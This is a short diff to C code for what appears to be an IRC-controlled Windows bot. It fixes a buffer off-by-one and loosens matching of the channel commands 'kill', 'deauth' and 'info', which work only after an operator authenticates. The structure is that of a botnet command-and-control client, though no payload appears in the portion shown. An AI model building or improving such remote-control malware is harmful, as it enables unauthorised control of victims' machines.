@@ -21,8 +21,9 @@ void et_main_loop_win(SOCKET socket, char *nick)
 
 	while(1)
 	{
+		ZeroMemory(buf, 1024);
 		recv(socket, buf, 1023, 0);
-		buf[1024] = '\0';
+		buf[1023] = '\0';
 
 		char *ping;
 		if ((ping = strstr(buf, "PING")) && !(strstr(buf, "CASEMAPPING")))
@@ -64,18 +65,18 @@ void et_main_loop_win(SOCKET socket, char *nick)
 				}
 				else
 				{
-					if (!strcmp(cmd, "kill"))
+					if (strstr(cmd, "kill"))
 					{
 						break; /* back to main@et_win.c */
 					}
-					else if (!strcmp(cmd, "deauth"))
+					else if (strstr(cmd, "deauth"))
 					{
 						char deauth_message[256];
 						_snprintf(deauth_message, 256, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
 						send(socket, deauth_message, strlen(deauth_message), 0);
 						auth = 0;
 					}
-					else if (!strcmp(cmd, "info"))
+					else if (strstr(cmd, "info"))
 					{
 						char kern[256];
 
